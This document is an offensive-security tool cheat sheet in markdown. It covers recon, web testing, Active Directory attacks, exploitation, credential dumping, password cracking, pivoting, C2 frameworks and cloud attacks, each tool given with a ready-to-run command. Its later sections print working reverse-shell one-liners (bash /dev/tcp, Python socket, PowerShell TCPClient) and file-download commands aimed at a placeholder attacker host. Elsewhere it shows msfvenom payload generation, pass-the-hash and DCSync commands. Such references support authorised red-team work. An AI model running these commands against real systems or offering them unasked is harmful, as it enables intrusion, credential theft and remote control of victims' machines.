# Security Tools Reference

Comprehensive, categorized reference of offensive-security tooling across the full
engagement lifecycle: **recon → web → AD/identity → exploitation → password attacks →
pivoting → C2 → cloud/container → post-exploitation → forensics/analysis**. Each tool
gets a one-line purpose and a key command. For the single-page command set, see
`master-cheatsheet.md` in this directory. For platform-specific depth see the
`11-cloud-security/` and `08-active-directory/` guides.

> Conventions: `<TARGET>` = host/IP/URL, `<DOMAIN>` = AD/DNS domain, `<ATTACKER>` =
> your IP. Replace wordlist paths with your environment's (`/usr/share/seclists/...`).

---

## 1. Reconnaissance & OSINT

| Tool | One-liner | Key command |
|------|-----------|-------------|
| **nmap** | Port/service/OS scan + NSE scripts | `nmap -sC -sV -p- <TARGET>` |
| **masscan** | Internet-scale async port scanner | `masscan -p1-65535 <TARGET> --rate=1000` |
| **rustscan** | Fast port scan → pipes to nmap | `rustscan -a <TARGET> -- -sC -sV` |
| **naabu** | Fast SYN/CONNECT port scanner (ProjectDiscovery) | `naabu -host <TARGET> -top-ports 1000` |
| **subfinder** | Passive subdomain enumeration | `subfinder -d <DOMAIN> -all -silent` |
| **amass** | Subdomain enum + attack-surface graph | `amass enum -passive -d <DOMAIN>` |
| **dnsx** | Fast DNS resolver/bruteforce | `dnsx -l subs.txt -resp` |
| **httpx** | Probe live hosts, titles, tech, status | `httpx -l hosts.txt -title -tech-detect -sc` |
| **theHarvester** | Emails/subdomains/hosts from OSINT | `theHarvester -d <DOMAIN> -b all` |
| **recon-ng** | Modular OSINT framework | `marketplace install all` then `modules load ...` |
| **shodan** | Internet device search (CLI) | `shodan search 'org:"Acme"'` |
| **dnsrecon** | DNS records, zone transfer, brute | `dnsrecon -d <DOMAIN> -a` |
| **fierce** | DNS recon / subdomain scan | `fierce --domain <DOMAIN>` |
| **whatweb** | Web tech fingerprint | `whatweb <TARGET>` |
| **gowitness / aquatone** | Screenshot a list of web hosts | `gowitness scan file -f urls.txt` |
| **gau / waybackurls** | Historical URLs from archives | `gau <DOMAIN>` |
| **katana** | Modern crawler (JS-aware) | `katana -u <TARGET> -jc -d 3` |

```bash
# Standard external recon chain
subfinder -d <DOMAIN> -all -silent | dnsx -silent | httpx -silent -title -tech-detect -o live.txt
nmap -sC -sV -p- -oA full <TARGET>
```

---

## 2. Web Application Testing

| Tool | One-liner | Key command |
|------|-----------|-------------|
| **Burp Suite** | Intercepting proxy + scanner | proxy `127.0.0.1:8080`; Repeater/Intruder/Scanner |
| **OWASP ZAP** | Open-source web proxy/scanner | `zap.sh -cmd -quickurl <TARGET>` |
| **ffuf** | Fast content/param/vhost fuzzer | `ffuf -u <TARGET>/FUZZ -w list.txt -mc 200,301` |
| **feroxbuster** | Recursive content discovery | `feroxbuster -u <TARGET> -w list.txt` |
| **gobuster** | Dir/DNS/vhost brute | `gobuster dir -u <TARGET> -w list.txt -x php,txt` |
| **dirsearch** | Web path scanner | `dirsearch -u <TARGET> -e php,asp,aspx` |
| **nuclei** | Template-based vuln scanner | `nuclei -l live.txt -severity critical,high` |
| **nikto** | Web server misconfig scanner | `nikto -h <TARGET>` |
| **sqlmap** | Automated SQL injection | `sqlmap -u "<TARGET>?id=1" --batch --dump` |
| **wpscan** | WordPress audit | `wpscan --url <TARGET> --enumerate u,vp,vt` |
| **nosqlmap** | NoSQL injection | `nosqlmap` (interactive) |
| **dalfox** | XSS scanner | `dalfox url <TARGET>?q=test` |
| **jwt_tool** | JWT analysis/forgery | `jwt_tool <TOKEN> -C -d wordlist.txt` |
| **arjun** | HTTP parameter discovery | `arjun -u <TARGET>` |
| **commix** | Command-injection exploitation | `commix --url "<TARGET>?id=1"` |
| **tplmap / SSTImap** | SSTI detection/exploitation | `python3 sstimap.py -u "<TARGET>?n=x"` |
| **crlfuzz** | CRLF injection | `crlfuzz -u <TARGET>` |

```bash
# Fuzz directories, filter noise, follow extensions
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.txt -mc all -fc 404
sqlmap -u "http://<TARGET>/page?id=1" --batch --level=3 --risk=2 --dump
```

---

## 3. Active Directory & Identity

| Tool | One-liner | Key command |
|------|-----------|-------------|
| **BloodHound CE + SharpHound** | AD/Entra attack-path graphing | `SharpHound.exe -c All` → import to BloodHound CE |
| **bloodhound-python** | Remote AD collector (no agent) | `bloodhound-python -u u -p p -d <DOMAIN> -c All -ns <DC>` |
| **Impacket suite** | SMB/Kerberos/MSRPC swiss army | see §5 |
| **NetExec (nxc)** | Successor to CrackMapExec — sweep/auth | `nxc smb <CIDR> -u u -p p --shares` |
| **enum4linux-ng** | SMB/LDAP enumeration | `enum4linux-ng -A <DC>` |
| **ldapdomaindump** | Dump AD via LDAP to HTML | `ldapdomaindump -u '<DOMAIN>\u' -p p <DC>` |
| **kerbrute** | User enum + password spray (Kerberos) | `kerbrute userenum -d <DOMAIN> users.txt` |
| **Rubeus** | Kerberos abuse (Windows) | `Rubeus.exe kerberoast` |
| **Certipy** | AD CS (ESC1-ESC16) enum/abuse | `certipy find -u u@<DOMAIN> -p p -dc-ip <DC>` |
| **Certify** | AD CS abuse (Windows/.NET) | `Certify.exe find /vulnerable` |
| **PowerView / PowerSploit** | AD recon/abuse (PowerShell) | `Get-DomainUser -SPN` |
| **PingCastle** | AD security posture scoring | `PingCastle.exe --healthcheck` |
| **adidnsdump** | Dump AD-integrated DNS | `adidnsdump -u '<DOMAIN>\u' <DC>` |
| **Coercer / PetitPotam** | Force NTLM auth (relay setup) | `Coercer coerce -u u -p p -t <DC> -l <ATTACKER>` |
| **mitm6** | IPv6 DNS takeover for NTLM relay | `mitm6 -d <DOMAIN>` |
| **donpapi** | Mass DPAPI/cred looting | `donpapi -u u -p p -t <CIDR>` |

```bash
# Modern AD foothold-to-paths flow
nxc smb <CIDR> -u u -p p --shares
bloodhound-python -u u -p p -d <DOMAIN> -dc <DC> -c All -ns <DC>
certipy find -u u@<DOMAIN> -p p -dc-ip <DC> -vulnerable -stdout
```

---

## 4. Exploitation Frameworks

| Tool | One-liner | Key command |
|------|-----------|-------------|
| **Metasploit** | Exploit/payload/post framework | `msfconsole`; `use exploit/...`; `set RHOSTS`; `run` |
| **msfvenom** | Payload generator | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<A> LPORT=443 -f exe -o s.exe` |
| **searchsploit** | Offline Exploit-DB search | `searchsploit <product version>` |
| **nuclei** | Mass CVE/template exploitation | `nuclei -l hosts.txt -t cves/` |
| **routersploit** | Embedded/IoT exploitation | `rsf` (interactive) |
| **PEASS-ng winPEAS/linPEAS** | Local privesc enumeration | `./linpeas.sh` / `winpeas.exe` |
| **GTFOBins / LOLBAS** | Living-off-the-land binary lookup | (web refs in §13) |
| **pwntools** | Binary exploitation scripting | `from pwn import *` |
| **Exploit-DB / GitHub PoCs** | Public CVE PoCs | clone + read before running |

```bash
# Reverse-shell payload + handler
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=443 -f elf -o s.elf
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST <ATTACKER>; set LPORT 443; run"
```

---

## 5. Post-Exploitation & Credential Access

| Tool | One-liner | Key command |
|------|-----------|-------------|
| **impacket-psexec/wmiexec/smbexec/atexec** | Remote command exec | `impacket-wmiexec '<DOMAIN>/u:p@<TARGET>'` |
| **impacket-secretsdump** | Dump SAM/LSA/NTDS hashes | `impacket-secretsdump '<DOMAIN>/u:p@<TARGET>'` |
| **impacket-GetUserSPNs** | Kerberoast | `impacket-GetUserSPNs '<DOMAIN>/u:p' -dc-ip <DC> -request` |
| **impacket-GetNPUsers** | AS-REP roast | `impacket-GetNPUsers '<DOMAIN>/' -usersfile u.txt -no-pass` |
| **impacket-ntlmrelayx** | NTLM relay | `impacket-ntlmrelayx -tf targets.txt -smb2support` |
| **Mimikatz** | Windows credential extraction | `sekurlsa::logonpasswords` |
| **lsassy / pypykatz** | Remote/offline LSASS parsing | `pypykatz lsa minidump lsass.dmp` |
| **NetExec (nxc)** | Multi-proto sweep + modules | `nxc smb <CIDR> -u u -H <HASH> -x whoami` |
| **evil-winrm** | WinRM shell (pass/hash/cert) | `evil-winrm -i <TARGET> -u u -H <HASH>` |
| **Responder** | LLMNR/NBT-NS/MDNS poisoning | `responder -I eth0` |
| **LaZagne** | Local app-credential recovery | `laZagne.exe all` |
| **SharpChrome / hekatomb** | Browser/DPAPI secrets | `SharpChrome.exe logins` |

```bash
# Pass-the-hash command execution
nxc smb <TARGET> -u Administrator -H <NTLM_HASH> -x "whoami /all"
evil-winrm -i <TARGET> -u Administrator -H <NTLM_HASH>
impacket-secretsdump '<DOMAIN>/u:p@<DC>' -just-dc-ntlm   # DCSync
```

---

## 6. Password Attacks

| Tool | One-liner | Key command |
|------|-----------|-------------|
| **hashcat** | GPU hash cracking | `hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule` |
| **John the Ripper** | CPU hash cracking + 2john tools | `john --wordlist=rockyou.txt hashes.txt` |
| **hydra** | Network login brute | `hydra -L u.txt -P p.txt ssh://<TARGET>` |
| **medusa** | Parallel login brute | `medusa -h <TARGET> -U u.txt -P p.txt -M ssh` |
| **patator** | Flexible brute (many modules) | `patator ssh_login host=<TARGET> user=u password=FILE0 0=p.txt` |
| **CeWL** | Wordlist from a target site | `cewl <TARGET> -d 3 -w words.txt` |
| **kerbrute** | Kerberos spray (no lockout noise) | `kerbrute passwordspray -d <DOMAIN> u.txt 'Pass!'` |
| **crackmapexec/nxc** | SMB/WinRM/MSSQL spray | `nxc smb <CIDR> -u u.txt -p 'Pass!' --continue-on-success` |

```bash
# Common hashcat modes
# 0=MD5 100=SHA1 1000=NTLM 1800=sha512crypt 3200=bcrypt 5600=NetNTLMv2
# 13100=Kerberoast(TGS) 18200=AS-REP 22000=WPA-PMKID/EAPOL 1500=descrypt
hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 7. Pivoting & Tunneling

| Tool | One-liner | Key command |
|------|-----------|-------------|
| **Ligolo-ng** | Modern TUN-based pivot (no SOCKS pain) | agent→proxy; `ip route add <NET> dev ligolo` |
| **chisel** | Fast TCP/UDP tunnel over HTTP | `chisel server -p 8080 --reverse` / `chisel client <A>:8080 R:socks` |
| **sshuttle** | "Poor-man's VPN" over SSH | `sshuttle -r user@<JUMP> <NET>/24` |
| **proxychains-ng** | Force tools through a SOCKS proxy | `proxychains nmap -sT -Pn <NET>` |
| **socat** | Swiss-army relay/port-forward | `socat TCP-LISTEN:8080,fork TCP:<TARGET>:80` |
| **ssh** | Native local/remote/dynamic forwards | `ssh -D 1080 user@<JUMP>` (SOCKS) |
| **plink.exe** | SSH tunneling on Windows | `plink -R 1080 user@<A>` |
| **dnscat2 / iodine** | DNS tunneling (restrictive egress) | `dnscat2-server <DOMAIN>` |

```bash
# Ligolo-ng (recommended modern pivot)
# attacker: ./proxy -selfcert ; target: ./agent -connect <ATTACKER>:11601
# in proxy console: session; start; then on attacker host:
sudo ip route add 10.10.0.0/24 dev ligolo

# chisel reverse SOCKS
# attacker: chisel server -p 8080 --reverse
# target:   chisel client <ATTACKER>:8080 R:socks
proxychains nxc smb 10.10.0.0/24
```

---

## 8. Command & Control (C2)

| Framework | One-liner | Notes |
|-----------|-----------|-------|
| **Sliver** | OSS cross-platform C2 (mTLS/HTTP/DNS) | `sliver` → `generate --mtls <A> --os windows`; `mtls`; `use <session>` |
| **Mythic** | Multi-agent, web-UI, BOF support | docker-compose; agents: Apollo, Athena, Poseidon |
| **Havoc** | Modern Cobalt-Strike-like, EDR evasion | teamserver + client GUI |
| **Cobalt Strike** | Commercial standard (Beacon) | `beacon> sleep`, `inject`, `socks` |
| **Brute Ratel C4** | Commercial EDR-evasion C2 | badger implant |
| **Metasploit (multi/handler)** | Lightweight C2 / meterpreter | `use exploit/multi/handler` |
| **Empire / Starkiller** | PowerShell/Python C2 | `(Empire) > listeners` |
| **Villain / PoshC2** | Lightweight session managers | `villain` |

```bash
# Sliver quick start
sliver
> generate --mtls <ATTACKER>:443 --os windows --arch amd64 --save /tmp/imp.exe
> mtls --lport 443           # start listener
# run imp.exe on target → session appears
> sessions ; use <ID> ; shell ; socks5 start
```

> 2025 prevalence (Q2): Sliver, Havoc, Metasploit, Mythic, Brute Ratel, Cobalt Strike
> are the most-used in real attacks. Sliver/Mythic/Havoc dominate OSS red-team work.

---

## 9. Cloud & Container

| Tool | One-liner | Key command |
|------|-----------|-------------|
| **Pacu** | AWS post-exploitation framework | `pacu` → `run iam__privesc_scan` |
| **CloudFox** | Multi-cloud attack-path enum + loot | `cloudfox aws --profile p all-checks` |
| **Prowler** | Multi-cloud security/compliance checks | `prowler aws --profile p` |
| **ScoutSuite** | Multi-cloud config audit report | `scout aws --profile p` |
| **enumerate-iam** | Brute which AWS API calls succeed | `enumerate-iam --access-key … --secret-key …` |
| **ROADtools** | Entra ID dump + explorer | `roadrecon gather && roadrecon gui` |
| **AzureHound** | Azure/Entra attack-path collector | `azurehound -r <RT> --tenant <id> list` |
| **MicroBurst / AADInternals** | Azure recon, tokens, blob enum | `Invoke-EnumerateAzureBlobs -Base acme` |
| **GCPBucketBrute** | GCS public bucket discovery | `python3 gcpbucketbrute.py -k acme -u` |
| **kube-hunter** | Kubernetes vuln scanner | `kube-hunter --remote <API>` |
| **peirates** | K8s post-exploit (tokens, privesc, escape) | `peirates` |
| **kubeletctl** | Abuse open kubelet (10250) | `kubeletctl exec "id" -p <pod> -s <NODE>` |
| **Trivy** | Image/IaC/cloud/k8s scanner | `trivy image <img>` / `trivy k8s cluster` |
| **amicontained / deepce** | Container context + escape | `amicontained` / `./deepce.sh` |
| **Stratus Red Team** | Emulate cloud attack techniques | `stratus detonate aws.<technique>` |

```bash
# Cloud foothold triage (AWS example)
aws sts get-caller-identity
cloudfox aws --profile loot all-checks
pacu  # > import_keys loot ; run iam__privesc_scan
```

---

## 10. Forensics, RE & Analysis

| Tool | Purpose |
|------|---------|
| **Volatility3** | Memory forensics (`vol -f mem.raw windows.pslist`) |
| **Autopsy / Sleuth Kit** | Disk/file-system forensics |
| **Wireshark / tshark / tcpdump** | Packet capture & analysis |
| **Zeek / Suricata** | Network behavioral analysis / IDS |
| **Ghidra / IDA / radare2 / Cutter** | Reverse engineering / disassembly |
| **binwalk** | Firmware extraction |
| **ExifTool** | File metadata |
| **YARA** | Signature-based malware ID |
| **CyberChef** | Encoding/crypto "swiss-army knife" |
| **strings / xxd / hexdump** | Quick binary triage |

---

## 11. File Transfer & Utilities

```bash
# Serve files
python3 -m http.server 80
impacket-smbserver share . -smb2support               # SMB
updog -p 8000                                         # upload+download HTTP

# Download (target side)
wget http://<ATTACKER>/f -O /tmp/f ; curl http://<ATTACKER>/f -o /tmp/f
# Windows
powershell -c "iwr http://<ATTACKER>/f -OutFile C:\t\f"
certutil -urlcache -f http://<ATTACKER>/f C:\t\f
# Over SMB from target
copy \\<ATTACKER>\share\f C:\t\
```

---

## 12. Reverse Shells & Upgrades

```bash
# Linux
bash -i >& /dev/tcp/<ATTACKER>/443 0>&1
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("<ATTACKER>",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
# Windows (PowerShell)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER>',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"

# Listener + TTY upgrade
rlwrap nc -lvnp 443
# in shell: python3 -c 'import pty;pty.spawn("/bin/bash")' ; Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
```

---

## 13. References

- ProjectDiscovery toolkit (subfinder/httpx/nuclei/naabu/katana): https://github.com/projectdiscovery
- Impacket: https://github.com/fortra/impacket
- NetExec (CrackMapExec successor): https://github.com/Pennyw0rth/NetExec
- BloodHound CE: https://github.com/SpecterOps/BloodHound
- Certipy (AD CS): https://github.com/ly4k/Certipy
- Ligolo-ng: https://github.com/nicocha30/ligolo-ng
- chisel: https://github.com/jpillora/chisel
- Sliver: https://github.com/BishopFox/sliver
- Mythic: https://github.com/its-a-feature/Mythic
- Havoc: https://github.com/HavocFramework/Havoc
- Pacu / CloudFox / Prowler / ScoutSuite / peirates / kube-hunter / Trivy — see `11-cloud-security/`
- GTFOBins: https://gtfobins.github.io/ — LOLBAS: https://lolbas-project.github.io/
- HackTricks: https://book.hacktricks.wiki/ — PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- SecLists wordlists: https://github.com/danielmiessler/SecLists
- Bishop Fox — 2025 Red Team Tools: https://bishopfox.com/blog/2025-red-team-tools-c2-frameworks-active-directory-network-exploitation
